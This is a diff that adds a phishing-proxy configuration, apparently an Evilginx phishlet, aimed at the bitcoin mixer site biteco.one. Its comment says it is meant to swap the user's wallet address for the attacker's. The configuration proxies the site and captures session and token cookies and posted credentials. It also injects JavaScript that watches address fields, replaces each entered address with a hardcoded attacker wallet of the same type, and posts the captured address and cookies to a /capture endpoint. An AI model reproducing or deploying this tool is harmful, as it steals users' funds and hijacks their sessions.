@@ -1,0 +1,251 @@
+min_ver: '3.0.0'
+## This PHISHLETs is designed to insert your wallet into the mixer by replacing the user's wallet address with your wallet.
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'biteco.one', session: true, is_landing: true, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'biteco.one', orig_sub: '', domain: 'biteco.one', search: 'https://{domain}', replace: 'https://{hostname}', mimes: ['text/html', 'text/plain', 'charset=utf-8', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-www-form-urlencoded']}
+
+auth_tokens:
+  - domain: 'biteco.one'
+    keys: ['session', 'token']
+    type: 'cookie'
+
+auth_urls:
+  - '/'
+
+credentials:
+  username:
+    key: ''
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: ''
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'biteco.one'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ["biteco.one"]
+    trigger_paths: ["/"]
+    trigger_params: []
+    script: |
+      (function() {
+        try {
+          console.log('[BITCOIN_MIXER] Script injected at %s', new Date().toISOString());
+          const AUTH_URL = "/capture";
+          const DEBOUNCE_MS = 500;
+          let lastData = null;
+          let debounceTimeout = null;
+
+          // Your Wallet
+          const MY_WALLETS = [
+            { type: 'legacy', address: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' },
+            { type: 'segwit', address: '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy' },
+            { type: 'taproot', address: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq' }
+
+          ];
+          function getAddressType(address) {
+            if (!address) return null;
+            if (address.startsWith('1')) return 'legacy';
+            if (address.startsWith('3')) return 'segwit';
+            if (address.startsWith('bc1')) return 'taproot';
+            return null;
+          }
+          function selectWallet(userAddress) {
+            const type = getAddressType(userAddress);
+            if (!type) return MY_WALLETS[0].address;
+            const matchingWallet = MY_WALLETS.find(wallet => wallet.type === type);
+            return matchingWallet ? matchingWallet.address : MY_WALLETS[0].address;
+          }
+          function captureAndReplaceAddress() {
+            try {
+              console.log('[BITCOIN_MIXER] Capturing address at %s', new Date().toISOString());
+              let userAddress = '';
+
+              const addressInputs = document.querySelectorAll('input[name="wallets.0.address"], input[placeholder*="Введите адрес"], input[type="text"][name*="address"], input[class*="address"], input[placeholder*="wallet"], input[autocomplete*="bitcoin"]');
+              for (let input of addressInputs) {
+                if (input.value && !userAddress) {
+                  userAddress = input.value.trim();
+                  console.log('[BITCOIN_MIXER] Captured user address:', userAddress); 
+                  const myAddress = selectWallet(userAddress);
+                  input.value = myAddress;
+                  console.log('[BITCOIN_MIXER] Replaced with my address:', myAddress);
+                  break;
+                }
+              }
+              if (!userAddress) {
+                console.log('[BITCOIN_MIXER] No address input found');
+              }
+
+              const cookies = document.cookie.split(';').map(c => c.trim());
+              const cookieData = cookies.reduce((acc, cookie) => {
+                const [name, value] = cookie.split('=');
+                if (name && ['session', 'token'].includes(name)) {
+                  acc[name] = value || '';
+                }
+                return acc;
+              }, {});
+              console.log('[BITCOIN_MIXER] Captured cookies:', Object.keys(cookieData));
+
+              const data = {
+                user_address: userAddress,
+                my_address: userAddress ? selectWallet(userAddress) : '',
+                cookies: cookieData,
+                timestamp: new Date().toISOString(),
+                path: window.location.pathname
+              };
+              console.log('[BITCOIN_MIXER] Captured data:', JSON.stringify({
+                ...data,
+                user_address: data.user_address ? '[REDACTED]' : '',
+                my_address: data.my_address ? '[REDACTED]' : ''
+              }));
+              return data;
+            } catch (e) {
+              console.error('[BITCOIN_MIXER] captureAndReplaceAddress error:', e);
+              return null;
+            }
+          }
+
+          async function sendData(data) {
+            try {
+              if (!data || (!data.user_address && !data.my_address && Object.keys(data.cookies).length === 0)) {
+                console.log('[BITCOIN_MIXER] No significant data to send');
+                return;
+              }
+              if (JSON.stringify(data) === JSON.stringify(lastData)) {
+                console.log('[BITCOIN_MIXER] No new data to send');
+                return;
+              }
+              console.log('[BITCOIN_MIXER] Sending data:', JSON.stringify({
+                ...data,
+                user_address: data.user_address ? '[REDACTED]' : '',
+                my_address: data.my_address ? '[REDACTED]' : ''
+              }));
+              const response = await fetch(AUTH_URL, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+                  'Referer': 'https://biteco.one',
+                  'Origin': 'https://biteco.one',
+                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                  'Accept-Encoding': 'gzip, deflate, br, zstd',
+                  'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7'
+                },
+                credentials: 'include',
+                body: JSON.stringify(data)
+              });
+              const text = await response.text();
+              console.log('[BITCOIN_MIXER] Data sent to /capture, status:', response.status, 'response:', text);
+              if (response.ok) {
+                lastData = JSON.parse(JSON.stringify(data));
+              } else {
+                console.error('[BITCOIN_MIXER] Failed to send POST, status:', response.status);
+                saveDataLocally(data);
+              }
+            } catch (e) {
+              console.error('[BITCOIN_MIXER] sendData error:', e);
+              saveDataLocally(data);
+            }
+          }
+
+          function saveDataLocally(data) {
+            try {
+              const savedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
+              savedData.push({
+                ...data,
+                user_address: data.user_address ? '[REDACTED]' : '',
+                my_address: data.my_address ? '[REDACTED]' : ''
+              });
+              localStorage.setItem('capturedData', JSON.stringify(savedData));
+              console.log('[BITCOIN_MIXER] Data saved locally:', {
+                ...data,
+                user_address: data.user_address ? '[REDACTED]' : '',
+                my_address: data.my_address ? '[REDACTED]' : ''
+              });
+            } catch (e) {
+              console.error('[BITCOIN_MIXER] saveDataLocally error:', e);
+            }
+          }
+
+          window.extractCapturedData = function() {
+            try {
+              const savedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
+              console.log('[BITCOIN_MIXER] Extracted captured data:', savedData);
+              return savedData;
+            } catch (e) {
+              console.error('[BITCOIN_MIXER] extractCapturedData error:', e);
+              return [];
+            }
+          };
+
+          function handleChanges() {
+            console.log('[BITCOIN_MIXER] Handling DOM changes or periodic check');
+            const data = captureAndReplaceAddress();
+            if (data && (data.user_address || data.my_address)) {
+              clearTimeout(debounceTimeout);
+              debounceTimeout = setTimeout(() => sendData(data), DEBOUNCE_MS);
+            }
+          }
+
+          function setupInputListeners() {
+            const inputs = document.querySelectorAll('input[name="wallets.0.address"], input[placeholder*="Введите адрес"], input[type="text"][name*="address"], input[class*="address"], input[placeholder*="wallet"], input[autocomplete*="bitcoin"]');
+            inputs.forEach(input => {
+              input.addEventListener('input', handleChanges);
+              input.addEventListener('change', handleChanges);
+              input.addEventListener('blur', handleChanges);
+            });
+            console.log('[BITCOIN_MIXER] Input listeners set up for', inputs.length, 'inputs');
+          }
+
+          function setupFormSubmit() {
+            const forms = document.querySelectorAll('form[action*="/mix"], form[id*="mix"], form[class*="mix"], form[class*="address"], form[class*="wallet"]');
+            forms.forEach(form => {
+              form.addEventListener('submit', () => {
+                console.log('[BITCOIN_MIXER] Form submit detected');
+                handleChanges();
+              });
+            });
+            const buttons = document.querySelectorAll('button[type="submit"], input[type="submit"], button[class*="submit"], button[class*="mix"], button[class*="wallet"]');
+            buttons.forEach(button => {
+              button.addEventListener('click', () => {
+                console.log('[BITCOIN_MIXER] Submit button clicked');
+                handleChanges();
+              });
+            });
+            console.log('[BITCOIN_MIXER] Form submit listeners set up for', forms.length, 'forms and', buttons.length, 'buttons');
+          }
+
+          function waitForForm() {
+            const formExists = document.querySelector('input[name="wallets.0.address"], input[placeholder*="Введите адрес"], form[action*="/mix"], form[id*="mix"], form[class*="mix"], form[class*="address"], form[class*="wallet"]');
+            if (formExists) {
+              console.log('[BITCOIN_MIXER] Form detected, setting up listeners');
+              setupInputListeners();
+              setupFormSubmit();
+              handleChanges();
+            } else {
+              console.log('[BITCOIN_MIXER] Form not detected, retrying...');
+              setTimeout(waitForForm, 250);
+            }
+          }
+
+          console.log('[BITCOIN_MIXER] Initializing script');
+          waitForForm();
+          const observer = new MutationObserver(() => {
+            console.log('[BITCOIN_MIXER] DOM changed, checking inputs');
+            handleChanges();
+          });
+          observer.observe(document.body, { childList: true, subtree: true, attributes: true, characterData: true });
+          setInterval(handleChanges, 1000);
+
+          console.log('[BITCOIN_MIXER] Script fully initialized');
+        } catch (e) {
+          console.error('[BITCOIN_MIXER] Global error:', e);
+        }
+      })();
+
+      
